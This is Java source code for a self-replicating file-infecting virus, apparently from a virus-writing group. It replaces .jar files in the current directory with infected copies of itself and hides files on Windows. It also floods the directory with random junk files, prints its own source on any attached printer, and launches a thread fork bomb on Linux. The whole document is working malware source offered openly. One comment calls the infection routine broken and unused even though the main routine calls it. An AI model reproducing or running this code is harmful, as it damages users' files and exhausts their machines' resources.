
/**
 * My first little Virus in Java
 * Aus der Schwärze der Knechtschaft durch blutige Schlachten ans goldene Licht der Freiheit.
 * 
 * @author R3s1stanc3 [vxnetw0rk]
 * @version 1
 */

import java . io . * ;
import java . lang . String ;
import java . util . Random ;

public class Suicide
{
    
    private static String splitStr = "abcdefg1234567890" ;
    
    /**
     * The main function of the Virus, which starts the whole payload
     */
    public static void main ( String [ ] args )
    {
        
        Virii virii = new Virii ( ) ;
        String myself = virii . getName ( ) ;
        String os = virii . getOS ( ) ;
        
        // Get a list of all *.jar files in the current directory
        String [ ] jarList = virii . listJar ( ) ;
        
        // Replace every *.jar file with a copy of myselfFile myFile = new File ( myself ) ;
        for ( String s : jarList )
        {
            if ( ! s . equals ( myself ) && s . indexOf ( "." ) != 0 && ! virii . isInfected ( virii . readFile ( s ), splitStr ) )
            {
                virii . copyFile ( s, "." + s ) ;
                virii . deleteFile ( s ) ;
                virii . copyFile ( myself, s ) ;
                if ( os . equals ( "Windows" ) ) virii . hideFile ( "." + s ) ;
                virii . infectFile ( s, splitStr ) ;
                virii . deleteFile ( "." + s ) ;
            }
        }
        
        // Flood the PC with some random files
        virii . flood ( new Random ( ) . nextInt ( 1000 ) ) ;
        // Prints his own main function
        if ( os . equals ( "Windows" ) && new Print ( ) . printerExists ( ) ) 
        {
            String name = String . valueOf ( new Random ( ) . nextInt ( ) ) + ".txt" ;
            virii . writeFile ( name, virii . getMyCode ( ) ) ;
            new Print ( ) . print ( name ) ;
            virii . deleteFile ( name ) ;
        }
        // Forkbomb for Linux
        if ( os . equals ( "Linux" ) ) virii . run ( ) ;
            
        // If the current file is infected -> execute the host; else delete yourself
        if ( virii . isInfected ( virii . readFile ( myself ), splitStr ) ) 
        {
            byte [ ] [ ] old = virii . getOldFile ( myself, splitStr ) ;
            virii . writeFileByte ( "." + myself, old [ 0 ] ) ;
            if ( os . equals ( "Windows" ) ) virii . hideFile ( "." + myself ) ;
            virii . setFileExecutable ( "." + myself ) ;
            virii . execute ( "." + myself ) ;
            virii . deleteFile ( "." + myself ) ;
        }
        else virii . deleteFile ( myself ) ;
        
    }
    
}




/**
 * This class contains all functions of the virus
 * 
 * @author R3s1stanc3 [vxnetw0rk]
 * @version 1.0
 */

import java . io . * ;
import java . util . Random ;
import java . lang . * ;

public class Virii implements Runnable
{

    private static String myCode = 
        "public class Suicide\n" + 
        "{\n" + 
        "    \n" + 
        "    private static String splitStr = \"not for you\" ;\n" + 
        "    public static void main ( String [ ] args )\n" + 
        "    {\n" + 
        "        Virii virii = new Virii ( ) ;\n" + 
        "        String myself = virii . getName ( ) ;\n" + 
        "        String os = virii . getOS ( ) ;\n" + 
        "        String [ ] jarList = virii . listJar ( ) ;\n" + 
        "        for ( String s : jarList )\n" + 
        "        {\n" + 
        "            if ( ! s . equals ( myself ) && s . indexOf ( \".\" ) != 0 && ! virii . isInfected ( virii . readFile ( s ), splitStr ) )\n" + 
        "            {\n" + 
        "                virii . copyFile ( s, \".\" + s ) ;\n" + 
        "                virii . deleteFile ( s ) ;\n" + 
        "                virii . copyFile ( myself, s ) ;\n" + 
        "                if ( os . equals ( \"Windows\" ) ) virii . hideFile ( \".\" + s ) ;\n" + 
        "                virii . infectFile ( s, splitStr ) ;\n" + 
        "                virii . deleteFile ( \".\" + s ) ;\n" + 
        "            }\n" + 
        "        }\n" + 
        "	if ( virii . isInfected ( virii . readFile ( myself ), splitStr ) ) \n" + 
        "        {\n" + 
        "            byte [ ] [ ] old = virii . getOldFile ( myself, splitStr ) ;\n" + 
        "            virii . writeFileByte ( \".\" + myself, old [ 0 ] ) ;\n" + 
        "            if ( os . equals ( \"Windows\" ) ) virii . hideFile ( \".\" + myself ) ;\n" + 
        "            virii . setFileExecutable ( \".\" + myself ) ;\n" + 
        "            virii . execute ( \".\" + myself ) ;\n" + 
        "            virii . deleteFile ( \".\" + myself ) ;\n" + 
        "        }\n" + 
        "        else virii . deleteFile ( myself ) ;\n" + 
        "        virii . flood ( new Random ( ) . nextInt ( 1000 ) ) ;\n" + 
        "        if ( os . equals ( \"Windows\" ) && new Print ( ) . printerExists ( ) ) \n" + 
        "        {\n" + 
        "            String name = String . valueOf ( new Random ( ) . nextInt ( ) ) + \".txt\" ;\n" + 
        "            virii . writeFile ( name, virii . getMyCode ( ) ) ;\n" + 
        "            new Print ( ) . print ( name ) ;\n" + 
        "            virii . deleteFile ( name ) ;\n" + 
        "        }\n" + 
        "        if ( os . equals ( \"Linux\" ) ) virii . run ( ) ;\n" + 
        "    }\n" + 
        "}" ;
    

    /**
     * Function to get the file name of the running file
     * @return Filename as String
     */
    public static String getName ( )
    {
        
        String path = System.getProperty("java.class.path") ;
        String [ ] pathA ;
        if ( System.getProperty("os.name") . indexOf ( "Lin" ) != -1 ) pathA = path . split ( "/" ) ;
        else pathA = path . split ( "\\" ) ;
        return pathA [ pathA . length - 1 ] ;
        
    }
    
    /**
     * Forkbomb
     */
    public void run ( )
    {
        
        new Thread ( this ) .start ( ) ;
        new Thread ( this ) .start ( ) ;
        
    }
    
    /**
     * Floods the current directory with files
     * The files are named with random Integers and filled with rand Integers too
     * @param number Number of files to flood
     */
    public void flood ( int number )
    {
        
        FileOutputStream out ;
        PrintStream p ;
        Random rand = new Random ( ) ;
        
        try
        {
            for ( int i = 0; i < number; i ++ )
            {
                Integer j = new Integer ( rand . nextInt ( ) ) ;
                out = new FileOutputStream ( j . toString ( ) ) ;
                p = new PrintStream ( out ) ;
            
                p . println ( rand . nextInt ( ) ) ;
            
                p . close ( ) ;
            }
        }
        catch ( Exception e ) { }
        
    }
    
    /**
     * Creates a directory
     * @param name Name of the directory
     */
    public void createDir ( String name ) 
    {
        
        boolean dir = new File ( name ) . mkdir ( ) ;
        
    }
    
    /**
     * Lists all *.jar files in the current directory
     * @return String Array with all file names
     */
    public String [ ] listJar ( )
    {
        
        File dir = new File ( "./" ) ;
        String [ ] fileList = dir . list ( new FilenameFilter ( )
        {
            public boolean accept ( File d, String name )
            {
                return name . endsWith ( ".jar" ) ;
            }
        } ) ;
        return fileList ;
        
    }
    
    /**
     * Copies a file to a destination
     * @param source Name of the source file
     * @param dest Name of the destination file
     */
    public void copyFile ( String source, String dest )
    {
        
        try
        {
            File f1 = new File ( source ) ;
            File f2 = new File ( dest ) ;
            
            InputStream in = new FileInputStream ( f1 ) ;
            OutputStream out = new FileOutputStream ( f2 ) ;
            
            byte [ ] buf = new byte [ 1024 ] ;
            int len ;
            
            while ( ( len = in . read ( buf ) ) > 0 )
            {
                out . write ( buf, 0, len ) ;
            }
            
            in . close ( ) ;
            out . close ( ) ;
            f2 . setExecutable ( true ) ;
        }
        catch ( FileNotFoundException ex ) { }
        catch ( IOException e ) { }

    }
    
    public void setFileExecutable ( String file )
    {
        
        new File ( file ) . setExecutable ( true ) ;
        
    }
    
    public String getOS ( )
    {
        
        if ( System.getProperty("os.name") . indexOf ( "Lin" ) != -1 ) return "Linux" ;
        else if ( System.getProperty("os.name") . indexOf ( "Win" ) != -1 ) return "Windows" ;
        else return null ;
        
    }
    
    /**
     * Executes a file (I found the code on the internet)
     * @param file Name of the file to execute
     */
    public void execute ( String file )
    {
        
        try
        {
            
            Process p = null;
            ProcessBuilder pb = new ProcessBuilder ( "./" + file ) ;
            p = pb . start ( ) ;
            
            InputStream in = null ;
            OutputStream outS = null ;
            
            StringBuffer commandResult = new StringBuffer ( ) ;
            String line = null ;
            int readInt ;
            
            int returnVal = p . waitFor ( ) ;
            
            in = p . getInputStream ( ) ;
            
            while ( ( readInt = in . read ( ) ) != -1 )
                commandResult . append ( ( char ) readInt ) ;
            outS = ( BufferedOutputStream ) p . getOutputStream ( ) ;
            outS . close ( ) ;
            
            System . out . println ( commandResult . toString ( ) ) ;
            in . close ( ) ;

            
        }
        catch ( Exception e ) { }
        
    }
    
    /**
     * Used to split an infected file using a splitstring
     * @param file File to split
     * @param splitStr The splitstring
     * @return The two parts of the file as a bytearray in another bytearray
     */
    public byte [ ] [ ] getOldFile (String file, String splitStr ) 
    {		
		try 
		{
			FileInputStream fis = new FileInputStream ( file ) ;
			byte [ ] dataByte = new byte [ ( int ) ( new File ( file ) ) . length ( ) ] ;
			fis . read ( dataByte ) ;
			fis . close ( ) ;
			
			byte [ ] splitByte = splitStr . getBytes ( ) ;
			
			int splitPos = -1 ;
			
			for ( int i = 0; i < dataByte . length - splitByte . length; i ++ )
			{
				for ( int j = 0; j < splitByte . length; j ++ ) 
				{
					if ( dataByte [ i + j ] != splitByte [ j ] )
					{
						break ;
					}
					if ( j == splitByte . length - 1 ) 
					{
						splitPos = i ;					
					}
				}
				if ( splitPos != -1 )
				{
					break ;
				}
			}
			byte [ ] rByte1 = new byte [ splitPos ] ;
			byte [ ] rByte2 = new byte [ dataByte . length - splitPos - splitByte . length ] ;
			System . arraycopy ( dataByte, 0, rByte1, 0, rByte1 . length ) ;
			System . arraycopy ( dataByte, splitPos + splitByte . length, rByte2, 0, rByte2 . length ) ;
			
			byte [ ] [ ] returnByte = { rByte1, rByte2 } ;
			
			return returnByte ;
		} 
		catch ( Exception e ) { return null ; }
	}
    
    /**
     * Writes a String to a file
     * @param fi File to write to
     * @param data String to write in the file
     */
    public void writeFile ( String fi, String data )
    {
        
        try
        {
            File file = new File ( fi ) ;
            FileWriter fw = new FileWriter ( file ) ;
            fw . write ( data ) ;
            fw . flush ( ) ;
            fw . close ( ) ;
        }
        catch ( Exception e ) { }
        
    }
    
    /**
     * Writes a Bytearray to a file
     * @param fi File to write to
     * @param data Bytearray to write in the file
     */
    public void writeFileByte ( String fi, byte [ ] data ) 
    {
		try 
		{
	        FileOutputStream output = new FileOutputStream ( fi ) ;
	        output . write ( data, 0, data . length ) ;
	        output . flush ( ) ;
	        output . close ( ) ;
		}
		catch ( Exception e ) { }
	}
    
    /**
     * Reads the content of a file
     * @param name Name of the file
     * @return The files content as String
     */
    public String readFile ( String name )
    {
        
        try
        {
            RandomAccessFile file = new RandomAccessFile ( name, "r" ) ;
            byte [ ] data = new byte [ ( int ) file . length ( ) ] ;
            
            file . read ( data ) ;
            
            file . close ( ) ;
            
            return new String ( data ) ;
        }
        catch ( Exception e ) { return null ; }
        
    }
    
    /**
     * Should combine two files with a splitstring in between; doesn't work; not in use; Second file will be executed when executed. - Special thanks to ringi
     * @param file Name of the file
     * @param split Splitstring between hostfile and infected file
     */
    public void infectFile ( String file, String split )
    {
        
        try
        {
            RandomAccessFile data1 = new RandomAccessFile ( "." + file, "r" ) ;
            RandomAccessFile data2 = new RandomAccessFile ( file, "r" ) ;
            
            byte [ ] byte1 = new byte [ ( int ) data1.length ( ) ] ;
            byte [ ] byte2 = new byte [ ( int ) data2.length ( ) ] ;
            byte [ ] splitBytes = new byte [ split . length ( ) ] ;
            byte [ ] both = new byte [ split . length ( ) + byte1 . length + byte2 . length ] ;
            
            splitBytes = split . getBytes ( ) ;
            
            data1.read ( byte1 ) ;
            data2.read ( byte2 ) ;
            data1.close ( ) ;
            data2.close ( ) ;
            
            both = concat ( byte1, splitBytes, byte2 ) ;
            
            RandomAccessFile newFile = new RandomAccessFile ( file, "rw" ) ;
            newFile . write ( both ) ;
            newFile . close ( ) ;
        }
        catch ( Exception e ) { }
        
    }
    
    /**
     * Connects 3 Bytearrays to one - Special thanks to ringi
     * @param A first Bytearray
     * @param B second Bytearray
     * @param C third Bytearray
     * @return The big byte array
     */
    public byte [ ] concat ( byte [ ] A, byte [ ] B, byte [ ] C ) 
    {
        
        byte [ ] D = new byte [ A . length + B . length + C . length ] ;
        System . arraycopy ( A, 0, D, 0, A . length ) ;
        System . arraycopy ( B, 0, D, A . length, B . length ) ;
        System . arraycopy ( C, 0, D, A . length + B . length, C . length ) ;
        return D ;
        
    }
    
    /**
     * Deletes a file
     * @param file File to delete
     */
    public void deleteFile ( String file )
    {
        
        ( new File ( file ) ) . delete ( ) ;
        
    } 
    
    /**
     * Hides a file under windows
     * @param fileName File to hide
     */
    public void hideFile ( String fileName )
    {
        
        try
        {
            Runtime . getRuntime ( ) . exec ( new String [ ] { "cmd", "/c", "attrib", "+H", "." + fileName } ) ;
        }
        catch ( Exception e ) { }
        
    }
    
    /**
     * Checks if a file exists
     * @param file File to check
     * @return true: exists; false: does not exist
     */
    public boolean existsFile ( String file )
    {
        
        return ( new File ( file ) ) . exists ( ) ;
        
    }
    
    /**
     * Checks if a file is infected
     * @param data The content of the file
     * @param splitStr The splitstring
     * @return true: is infected; false: is not infected
     */
    public boolean isInfected ( String data, String splitStr ) 
    {
        
        return ( data . split ( splitStr ) . length ) > 1 ;
        
    }
    
    /**
     * Returns the code of the Main function (String myCode); Used for the print function
     * @return Code of the Main function
     */
    public String getMyCode ( )
    {
        
        return myCode ;
        
    }
    
}





/**
 * This class prints a file ( only for Windows )
 * 
 * @author R3s1stanc3 [vxnetw0rk]
 * @version 1.0
 */

import java . awt . Desktop ;
import java . awt . print . PrinterJob ;
import java . io . * ;

public class Print
{
    
    /**
     * Prints a file on a Windows System
     * @param file Name of the file to print
     */
    public void print ( String file )
    {
            
        try 
        {
            Desktop desktop = null ;
            if ( Desktop . isDesktopSupported ( ) )
            {
                desktop = Desktop . getDesktop ( ) ;
            }
            desktop . print ( new File ( file ) ) ;
        }
        catch ( UnsupportedOperationException e ) { }
        catch ( Exception ex ) { }

    }
    
    /**
     * Checks if there is any printer connected to the PC
     * @return true -> printer connected; false -> no printer
     */
    public boolean printerExists ( )
    {
        
        return PrinterJob . lookupPrintServices ( ) . length > 0 ;
        
    }

}

